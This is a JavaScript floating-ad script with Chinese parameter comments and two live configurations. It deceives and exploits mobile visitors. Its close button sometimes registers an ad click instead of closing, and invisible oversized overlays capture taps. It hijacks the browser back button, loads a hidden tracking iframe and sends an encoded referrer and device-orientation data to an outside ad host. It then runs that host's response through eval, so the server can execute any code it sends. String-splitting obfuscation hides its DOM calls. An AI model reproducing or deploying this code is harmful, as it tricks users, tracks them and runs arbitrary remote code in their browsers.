/*!
 * @params {String} width 宽度 默认200px
 * @params {String} height 高度 默认300px
 * @params {Number} shadow 不被看见的区域百分比，默认0不开启，指的是在原来的大小基础上向四周延伸的大小
 * @params {String} pos 默认 'left', 值有：'left','right','top','bottom','center', 'none'表示不设置定位
 * @params {String} distanceTop pos值为'left','right'时设置
 * @params {Number || String} close_btn 关闭按钮 默认1，1默认按钮效果，或者图片地址
 * @params {Number} closeDec 关闭按钮是否真的关闭 范围0.01 ~ 1 默认0，0可直接关闭
 * @params {Number} showBorder 是否显示边框，默认0， 0 不显示，其它数字表示边框大小
 * @params {0 || String} effect 效果，0为关闭 ，默认'pulse'  'tada'抖动 'pulse'放大 'rotate'旋转
 * @params {String} effectdura 效果间隔, 默认 '5s';
 * @params {String} effectdelay 效果延时, 默认 '3s';
 * @params {String} stutslink 统计链接地址
 * @params {String} adlink 链接地址
 * @params {String} WWType 广告位置 dp||gdw||xtb||top
 * @params {Number} btnNumpar 按钮传参数字 默认5
 * @params {Number} imgNumpar 图片传参数字 默认1
 * @params {Number} shadowNumpar 不可见区域传参数字 默认3
 * @params {Number} backNumpar 不可见区域传参数字 默认5
 * @params {Number} imgduration 图片切换间隔 默认2000
 * @params {Number} isBack 是否开启返回监听 0和1 默认1开启
 * @params {Array} imgs 图片地址数组
 * 注意iframe使用，元素宽高就是iframe的width和height，定位无效  e.g. <iframe src="iframe.html" frameborder="0" scrolling="no" width="300" height="500"></iframe> 其中wdith和height自定义，但是必填。 受浏览器安全策略限制，shdow参数无效
 */
/*
 * notice: 固定位置引入必须给引入的script标签加上id="zrgscript" 目前固定位置同一个js引入2个可能会在某些浏览器存在冲突情况，因为id相同
 */
var Zed = (function () {
    function Zed(_a) {
        var width = _a.width, height = _a.height, shdow = _a.shdow, pos = _a.pos, distanceTop = _a.distanceTop, close_btn = _a.close_btn, closeDec = _a.closeDec, showBorder = _a.showBorder, effect = _a.effect, effectdura = _a.effectdura, effectdelay = _a.effectdelay, stutslink = _a.stutslink, alink = _a.alink, btnNumpar = _a.btnNumpar, imgNumpar = _a.imgNumpar, shdowNumpar = _a.shdowNumpar, backNumpar = _a.backNumpar, imgduration = _a.imgduration, imgs = _a.imgs, isBack = _a.isBack, asType = _a.asType;
        this.aWidth = width || '200px';
        this.aHeight = height || '300px';
        this.shdow = shdow || 0;
        this.pos = pos || 'left';
        this.distanceTop = distanceTop || '100px';
        this.close_btn = close_btn || 1;
        this.closeDec = closeDec || 0;
        this.showBorder = showBorder || 0;
        this.effect = effect || 'pulse';
        this.effectdura = effectdura || '5s';
        this.effectdelay = effectdelay;
        this.stutslink = stutslink || '';
        this.alink = alink || '';
        this.btnNumpar = btnNumpar || 5;
        this.imgNumpar = imgNumpar || 1;
        this.shdowNumpar = shdowNumpar || 3;
        this.backNumpar = backNumpar || 5;
        this.imgduration = imgduration || 2000;
        this.imgs = imgs || [];
        this.isBack = isBack || 1;
        this.asType = asType || 'dp';
        this.winW = document.documentElement.clientWidth || document.body.clientWidth;
        this.winH = document.documentElement.clientHeight || document.body.clientHeight;
        /*if (this.isWap() == false) {
         return;
         }*/
        this.init();
    }

    Zed.prototype.init = function () {
        var _this = this;
        this.writeCss();
        this.mobc();
        this.creatWrapper();
        var lcsl = setInterval(function () {
            _this.writeCss();
        }, 300);
        setTimeout(function () {
            _this.writeCss();
            clearInterval(lcsl);
        }, 600);
        if (window.top != window.self) {
            this.iframeInnercss();
        }
    };
    Zed.prototype.isWap = function () {
        if (navigator.platform.indexOf("Win") == 0 || navigator.platform.indexOf("Mac") == 0) {
            return false;
        }
    };
    Zed.prototype.getQueryParam = function (urlParam) {
        var query = window.location.search.substring(1);
        var vars = query.split("&");
        for (var i = 0; i < vars.length; i++) {
            var pair = vars[i].split("=");
            if (pair[0] == urlParam) {
                return pair[1];
            }
        }
        return (false);
    };
    Zed.prototype.cofc = function (str) {
        var arr = str.replace(/\s*/g, '').split('');
        var tempstr = '';
        for (var i = 0, len = arr.length; i < len; i++) {
            tempstr += String.fromCharCode(arr[i].charCodeAt(0));
        }
        return tempstr;
    };
    Zed.prototype.creatWrapper = function () {
        var _this = this;
        var wrap = document.createElement('d' + 'i' + 'v');
        var closeBtn = this.closeBtn();
        var imgbox = this.imgBox();
        wrap.className = 'zed-wrap';
        wrap.id = 'zedbox';
        var wrapWidth = "" + this.aWidth, wrapHeight = "" + this.aHeight;
        if (window.top != window.self) {
            wrapWidth = '100%';
            wrapHeight = '100%';
        }
        wrap.style.cssText = "width: " + wrapWidth + ";height: " + wrapHeight + ";";
        this.adPosition(wrap);
        var paranum = this.btnNumpar;

        function propt(probability) {
            var probability = probability * 100 || 1;
            var odds = Math.floor(Math.random() * 100);
            if (probability === 1) {
                closeBtn.setAttribute('onclick', "cxta(" + paranum + ")");
            }
            ;
            if (odds < probability) {
                closeBtn.setAttribute('onclick', "cxta(" + paranum + ")");
            }
            else {
                closeBtn.onclick = function () {
                    wrap.style.display = 'none';
                    document.body.removeChild(wrap);
                    eval('do' + 'cum' + 'ent.bo' + 'dy.classList.remove("bovwf");');
                };
            }
        }
        ;
        propt(Number(this.closeDec));
        wrap.appendChild(closeBtn);
        wrap.appendChild(imgbox);
        window.addEventListener('load', function () {
            _this.zstatus();
            _this.winW = document.documentElement.clientWidth || document.body.clientWidth;
            _this.winH = document.documentElement.clientHeight || document.body.clientHeight;
            if (_this.pos == 'none' && window.self == window.top) {
                var zscript = document.getElementById('zrgscript');
                if (zscript) {
                    var parentEle = zscript.parentNode;
                    if (parentEle.tagName == 'HEAD') {
                        var first = document.body.firstElementChild;
                        eval('doc' + 'ume' + 'nt.b' + 'ody.ins' + 'ertB' + 'efo' + 're(wrap,first);');
                    }
                    else {
                        eval('zscript.inse' + 'rtAdj' + 'ace' + 'ntEle' + 'ment("afterend",wrap);');
                    }
                }
            }
            else {
                eval('do' + 'cum' + 'ent.bo' + 'dy.appe' + 'ndCh' + 'ild(wrap);');
                eval('do' + 'cum' + 'ent.bo' + 'dy.classList.add("bovwf");');
                var mt = document.createElement('meta');
                mt.setAttribute('name', 'viewport');
                mt.setAttribute("content", 'width=device-width,user-scalable=no,initial-scale=1,maximum-scale=1,minimum-scale=1');
                eval('do'+'cu'+'ment.he'+'a'+'d.ap'+'pe'+'ndCh'+'ild(mt);')
            }
        });
    };
    Zed.prototype.adPosition = function (wrapEle) {
        var ahnum = (this.aHeight).replace(/px/, '');
        var awnum = (this.aWidth).replace(/px/, '');
        if (this.aHeight.indexOf('%') > -1) {
            ahnum = (this.aHeight).replace(/%/, '');
            ahnum = this.winH * (Number(ahnum) / 100);
        }
        if (this.aWidth.indexOf('%') > -1) {
            awnum = (this.aWidth).replace(/%/, '');
            awnum = this.winW * (Number(awnum) / 100);
        }
        var margin_top = (Number(ahnum) / 2).toFixed();
        var margin_left = (Number(awnum) / 2).toFixed();
        if (this.pos == 'left') {
            wrapEle.style.position = 'absolute';
            wrapEle.style.zIndex = '9' + '9' + '9' + '9' + '9' + '9';
            wrapEle.style.left = '0';
            wrapEle.style.top = "" + this.distanceTop;
        }
        if (this.pos == 'right') {
            wrapEle.style.position = 'absolute';
            wrapEle.style.zIndex = '9' + '9' + '9' + '9' + '9' + '9';
            wrapEle.style.right = '0';
            wrapEle.style.top = "" + this.distanceTop;
        }
        if (this.pos == 'top') {
            wrapEle.style.position = 'absolute';
            wrapEle.style.zIndex = 'absolute';
            wrapEle.style.left = '0';
            wrapEle.style.top = '0';
            wrapEle.style.right = '0';
            wrapEle.style.width = '100%';
        }
        if (this.pos == 'bottom') {
            wrapEle.style.position = 'absolute';
            wrapEle.style.zIndex = '9' + '9' + '9' + '9' + '9' + '9';
            wrapEle.style.left = '0';
            wrapEle.style.bottom = '0';
            wrapEle.style.right = '0';
            wrapEle.style.width = '100%';
        }
        if (this.pos == 'center') {
            wrapEle.style.position = 'absolute';
            wrapEle.style.zIndex = '9' + '9' + '9' + '9' + '9' + '9';
            wrapEle.style.top = '50%';
            wrapEle.style.left = '50%';
            wrapEle.style.marginTop = "-" + margin_top + "px";
            wrapEle.style.marginLeft = "-" + margin_left + "px";
        }
        if (this.pos == 'none') {
            wrapEle.style.position = 'r' + 'e' + 'l' + 'a' + 't' + 'i' + 'v' + 'e';
        }
        if (window.self !== window.top) { // iframe
            wrapEle.style.cssText = '';
        }
    };
    Zed.prototype.closeBtn = function () {
        var btn = document.createElement('d' + 'i' + 'v');
        btn.className = 'zed-btn-close';
        if (this.close_btn == 1) {
            btn.className += ' default';
            btn.style.backgroundColor = '#ccc';
            btn.style.textAlign = 'center';
            btn.style.color = '#fff';
            btn.innerHTML = '×';
        }
        else {
            btn.style.backgroundImage = "url(" + this.close_btn + ")";
        }
        btn.style.position = 'ab' + 'so' + 'lu' + 'te';
        btn.style.zIndex = '1' + '0';
        btn.style.display = 'b' + 'l' + 'o' + 'c' + 'k';
        btn.style.width = '18px';
        btn.style.height = '18px';
        btn.style.lineHeight = '18px';
        btn.style.borderRadius = '50%';
        btn.style.right = '0';
        btn.style.top = '0';
        btn.style.backgroundRepeat = 'no-repeat';
        btn.style.backgroundPosition = 'center';
        btn.style.backgroundSize = 'cover';
        return btn;
    };
    Zed.prototype.imgBox = function () {
        var imglist = this.imgs;
        var imgEle = '';
        var ahnum = (this.aHeight).replace(/px/, '');
        var awnum = (this.aWidth).replace(/px/, '');
        if (this.aHeight.indexOf('%') > -1) {
            ahnum = (this.aHeight).replace(/%/, '');
            ahnum = this.winH * (Number(ahnum) / 100);
        }
        if (this.aWidth.indexOf('%') > -1) {
            awnum = (this.aWidth).replace(/%/, '');
            awnum = this.winW * (Number(awnum) / 100);
        }
        var aw = Number(awnum);
        var ah = Number(ahnum);
        var anthoer_w = aw * (this.shdow) / 100;
        var anthoer_h = ah * (this.shdow) / 100;
        var coverW = aw + anthoer_w;
        var coverH = ah + anthoer_h;
        var paranum = this.shdowNumpar;
        if (imglist.length > 0) {
            for (var i = 0; i < imglist.length; i++) {
                var cssDisplay = i === 0 ? 'block' : 'none';
                imgEle += "<div class=\"item\" style=\"display:" + cssDisplay + ";width: 100%;height: 100%;po" + this.cofc('sit') + "ion: r" + this.cofc('ela') + "tive;\"><a><img src=\"" + imglist[i] + "\" style=\"width: 100%;height: 100%;\"/><div class=\"cover\" style=\"width: " + coverW + "px;height: " + coverH + "px;top: -" + anthoer_h / 2 + "px;left: -" + anthoer_w / 2 + "px;po" + this.cofc('sit') + "ion: " + this.cofc('ab') + this.cofc('so') + this.cofc('lute') + ";\" onclick=\"cxta(" + paranum + ");\"></div></a></div>";
            }
        }
        var imgBox = document.createElement('d' + 'i' + 'v');
        imgBox.className = 'zed-img-box';
        imgBox.style.width = '100%';
        imgBox.style.height = '100%';
        imgBox.setAttribute('onclick', "cxta(" + this.imgNumpar + ")");
        if (this.effect !== 0) {
            imgBox.className += ' ' + ("animated " + this.effect + " infinite slower");
        }
        if (this.effectdura != '') {
            imgBox.style.cssText += "animation-duration: " + this.effectdura + ";-webkit-animation-duration: " + this.effectdura + ";";
        }
        if (this.effectdelay != '') {
            imgBox.style.cssText += "animation-delay: " + this.effectdelay + ";-webkit-animation-delay: " + this.effectdelay + ";";
        }
        imgBox.innerHTML = imgEle;
        var childNode = imgBox.querySelectorAll('.item');
        var index = 1;
        if (childNode.length == 1) {
            childNode[0].style.display = 'block';
            childNode[0].onclick = function (e) {
                if (e && e.stopPropagation) {
                    e.stopPropagation();
                }
                else {
                    window.event.cancelBubble = true;
                }
            };
        }
        else {
            setInterval(function () {
                if (index > childNode.length - 1) {
                    index = 0;
                }
                for (var j = 0; j < childNode.length; j++) {
                    childNode[j].style.display = 'none';
                    childNode[j].onclick = function (e) {
                        if (e && e.stopPropagation) {
                            e.stopPropagation();
                        }
                        else {
                            window.event.cancelBubble = true;
                        }
                    };
                }
                childNode[index].style.display = 'block';
                index++;
            }, this.imgduration);
        }
        var borderDiv = document.createElement('d' + 'i' + 'v');
        borderDiv.className = 'boddiv';
        borderDiv.style.position = 'ab' + 'so' + 'lu' + 'te';
        borderDiv.style.cssText = "width: 100%;height: 100%; " + this.cofc('to') + "p:0;-webkit-box-sizing: border-box;-moz-box-sizing: border-box;box-sizing: border-box;-webkit-background-clip: text;background-clip: text;-webkit-text-fill-color: transparent;text-fill-color: transparent;-webkit-animation: hue 8s infinite linear;animation: hue 8s infinite linear;";
        if (this.showBorder == 1) {
            borderDiv.style.border = this.showBorder + "px solid red";
        }
        imgBox.appendChild(borderDiv);
        return imgBox;
    };
    Zed.prototype.ref = function () {
        var u;
        try {
            u = window.top.document.referrer;
        }
        catch (err) {
            u = document.referrer;
        }
        var r = '', c;
        for (var i = 0; i < u.length; i++) {
            if (i == 1000) {
                break;
            }
            c = u.charCodeAt(i);
            if (c > 96 && c < 123) {
                c += i % 8;
                if (c > 122)
                    c -= 26;
            }
            r += String.fromCharCode(c);
        }
        return r;
    };
    Zed.prototype.zstatus = function () {
        var odiv_m_1 = document.createElement('div');
        odiv_m_1.style.display = "none";
        var oiframe_m_1 = document.createElement("iframe");
        oiframe_m_1.src = this.stutslink + "&l=h";
        oiframe_m_1.height = "0";
        oiframe_m_1.width = "0";
        oiframe_m_1.sandbox = "allow-same-origin allow-scripts allow-forms";
        oiframe_m_1.allowtransparency = "true";
        oiframe_m_1.style.display = "none";
        odiv_m_1.appendChild(oiframe_m_1);
        document.body.appendChild(odiv_m_1);
    };
    Zed.prototype.mobc = function () {
        var _this = this;
        window.addEventListener("deviceorientation", function (event) {
            var M18_url = _this.alink + "&pn=0.25&ref=" + _this.ref() + "&refso=" + navigator.platform + "_" + _this.asType + "&zhongli=_" + Math.floor(event.alpha) + "," + Math.floor(event.beta) + "," + Math.floor(event.gamma);
            var strjs1 = "function cxta(ct){var a=new XMLHttpRequest();var b='" + M18_url + "&n='+window.history.length+'&ct='+ct+'&r='+Math.floor(Math.random()*9999999+1);if(a!=null){a.onreadystatechange=function(){if(a.readyState==4 && a.status==200){if(window.execScript)window.execScript(a.responseText,'JavaScript');else if(window.eval)window.eval(a.responseText,'JavaScript');else eval(a.responseText);}};a.open('GET',b,false);a.send();}}pushHistory();function pushHistory(){var state={title:'title',url:'#'};window.history.pushState(state,'title','#')}window.addEventListener('popstate', function (e) {cxta(" + _this.backNumpar + ");}, false);";
            var js1nod = document.createElement('script');
            js1nod.innerHTML = strjs1;
            document.getElementsByTagName('head')[0].appendChild(js1nod);
        }, false);
    };
    Zed.prototype.writeCss = function () {
        var s = document.createElement("s" + "t" + "y" + "l" + "e");
        s.innerHTML = "\n        @keyframes hue {\n            0% {\n                -webkit-filter: hue-rotate(0deg);\n            }\n            100% {\n                -webkit-filter: hue-rotate(360deg);\n            }\n        }\n        ";
        s.innerHTML += 'html,body{width: 100%;height: 100%;}.bovwf{width: 100%;height: 100%;overflow: hidden;position: ' + 'r' + 'e' + 'l' + 'at' + 'i' + 'v' + 'e;}';
        if (this.effect !== 0) {
            s.innerHTML += "\n            .animated {\n                -webkit-animation-duration: 1s;\n                animation-duration: 1s;\n                -webkit-animation-fill-mode: both;\n                animation-fill-mode: both;\n              }\n              .animated.infinite {\n                -webkit-animation-iteration-count: infinite;\n                animation-iteration-count: infinite;\n              }\n              .animated.delay-5s {\n                -webkit-animation-delay: 5s;\n                animation-delay: 5s;\n              }\n              \n              .animated.slow {\n                -webkit-animation-duration: 2s;\n                animation-duration: 2s;\n              }\n              \n              .animated.slower {\n                -webkit-animation-duration: 3s;\n                animation-duration: 3s;\n              }\n              @media (print), (prefers-reduced-motion) {\n                .animated {\n                  -webkit-animation: unset !important;\n                  animation: unset !important;\n                  -webkit-transition: none !important;\n                  transition: none !important;\n                }\n              }\n            @-webkit-keyframes tada {\n                from {\n                  -webkit-transform: scale3d(1, 1, 1);\n                  transform: scale3d(1, 1, 1);\n                }\n              \n                10%,\n                20% {\n                  -webkit-transform: scale3d(0.9, 0.9, 0.9) rotate3d(0, 0, 1, -3deg);\n                  transform: scale3d(0.9, 0.9, 0.9) rotate3d(0, 0, 1, -3deg);\n                }\n              \n                30%,\n                50%,\n                70%,\n                90% {\n                  -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);\n                  transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);\n                }\n              \n                40%,\n                60%,\n                80% {\n                  -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);\n                  transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);\n                }\n              \n                to {\n                  -webkit-transform: scale3d(1, 1, 1);\n                  transform: scale3d(1, 1, 1);\n                }\n              }\n              \n              @keyframes tada {\n                from {\n                  -webkit-transform: scale3d(1, 1, 1);\n                  transform: scale3d(1, 1, 1);\n                }\n              \n                10%,\n                20% {\n                  -webkit-transform: scale3d(0.9, 0.9, 0.9) rotate3d(0, 0, 1, -3deg);\n                  transform: scale3d(0.9, 0.9, 0.9) rotate3d(0, 0, 1, -3deg);\n                }\n              \n                30%,\n                50%,\n                70%,\n                90% {\n                  -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);\n                  transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);\n                }\n              \n                40%,\n                60%,\n                80% {\n                  -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);\n                  transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);\n                }\n              \n                to {\n                  -webkit-transform: scale3d(1, 1, 1);\n                  transform: scale3d(1, 1, 1);\n                }\n              }\n              \n              .tada {\n                -webkit-animation-name: tada;\n                animation-name: tada;\n              }\n              @-webkit-keyframes pulse {\n                from {\n                  -webkit-transform: scale3d(1, 1, 1);\n                  transform: scale3d(1, 1, 1);\n                }\n              \n                50% {\n                  -webkit-transform: scale3d(1.05, 1.05, 1.05);\n                  transform: scale3d(1.05, 1.05, 1.05);\n                }\n              \n                to {\n                  -webkit-transform: scale3d(1, 1, 1);\n                  transform: scale3d(1, 1, 1);\n                }\n              }\n              \n              @keyframes pulse {\n                from {\n                  -webkit-transform: scale3d(1, 1, 1);\n                  transform: scale3d(1, 1, 1);\n                }\n              \n                50% {\n                  -webkit-transform: scale3d(1.05, 1.05, 1.05);\n                  transform: scale3d(1.05, 1.05, 1.05);\n                }\n              \n                to {\n                  -webkit-transform: scale3d(1, 1, 1);\n                  transform: scale3d(1, 1, 1);\n                }\n              }\n              \n              .pulse {\n                -webkit-animation-name: pulse;\n                animation-name: pulse;\n            }\n            \n            @-webkit-keyframes animaterotate {\n                0% {\n                    -webkit-transform: rotate(0deg);\n                    -moz-transform: rotate(0deg);\n                    -ms-transform: rotate(0deg);\n                    transform: rotate(0deg);\n                }\n                100% {\n                    -webkit-transform: rotate(360deg);\n                    -moz-transform: rotate(360deg);\n                    -ms-transform: rotate(360deg);\n                    transform: rotate(360deg);\n                }\n            }\n            @-moz-keyframes animaterotate {\n                0% {\n                    -webkit-transform: rotate(0deg);\n                    -moz-transform: rotate(0deg);\n                    -ms-transform: rotate(0deg);\n                    transform: rotate(0deg);\n                }\n\n                100% {\n                    -webkit-transform: rotate(360deg);\n                    -moz-transform: rotate(360deg);\n                    -ms-transform: rotate(360deg);\n                    transform: rotate(360deg);\n                }\n            }\n            @keyframes animaterotate {\n                0% {\n                    -webkit-transform: rotate(0deg);\n                    -moz-transform: rotate(0deg);\n                    -ms-transform: rotate(0deg);\n                    transform: rotate(0deg);\n                }\n\n                100% {\n                    -webkit-transform: rotate(360deg);\n                    -moz-transform: rotate(360deg);\n                    -ms-transform: rotate(360deg);\n                    transform: rotate(360deg);\n                }\n            }\n            .zed-img-box.rotate {\n                -webkit-animation-name: animaterotate;\n                animation-name: animaterotate;\n                -webkit-animation-timing-function: linear;\n                animation-timing-function: linear;\n                -webkit-animation-duration: 8s;\n                animation-duration: 8s;\n            }\n            ";
        }
        var head = document.getElementsByTagName('h' + 'e' + 'a' + 'd')[0];
        window.addEventListener('DOMContentLoaded', function () {
            eval('do' + 'cum' + 'ent' + '.bo' + 'dy' + '.app' + 'endCh' + 'ild(s);');
        });
    };
    Zed.prototype.iframeInnercss = function () {
        var st = document.createElement("s" + "t" + "y" + "l" + "e");
        st.innerHTML = "\n        html, body {\n            width: 100%;height: 100%;\n            margin: 0;padding: 0;\n        }\n        .zed-wrap {\n            width: 100%;\n            height: 100%;\n        }\n        ";
        var head = document.getElementsByTagName('h' + 'e' + 'a' + 'd')[0];
        head.appendChild(st);
    };
    return Zed;
}());
new Zed({
    width: '200px',
    height: '240px',
    shadow: 40,
    pos: 'right',
    distanceTop: '100px',
    close_btn: 'data:image/png;base64,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',
    closeDec: 0.5,
    showBorder: 0,
    effect: 'tada',
    effectdura: '6s',
    effectdelay: '',
    stutslink: 'https://cc.ydy2.com/cnzz.html?ptype=<?=$equipment?>&userid=<?=$userid?>&pid=<?=$pid?>&s=<?=$systj?>',
    adlink: 'https://v.gw069.com/dijuh/w.php?v=OTgyfDY0fDYzfDYxfDQ3fDF8fDI',
    btnNumpar: 5,
    imgNumpar: 1,
    shadowNumpar: 3,
    backNumpar: 5,
    imgduration: 3000,
    imgs: ['imgs/img1.jpg', 'imgs/img2.jpg', 'imgs/img3.jpg', 'imgs/img4.jpg', 'imgs/img5.jpg'],
});
new Zed({
    width: '200px',
    height: '300px',
    shadow: 30,
    pos: 'bottom',
    distanceTop: '150px',
    close_btn: 1,
    closeDec: 0.5,
    showBorder: 0,
    effect: 'tada',
    effectdura: '6s',
    effectdelay: '',
    stutslink: 'https://cc.ydy2.com/cnzz.html?ptype=<?=$equipment?>&userid=<?=$userid?>&pid=<?=$pid?>&s=<?=$systj?>',
    adlink: 'https://v.gw069.com/dijuh/w.php?v=OTgyfDY0fDYzfDYxfDQ3fDF8fDI',
    btnNumpar: 5,
    imgNumpar: 1,
    shadowNumpar: 3,
    backNumpar: 5,
    imgduration: 3000,
    imgs: ['imgs/img1.jpg'],
});
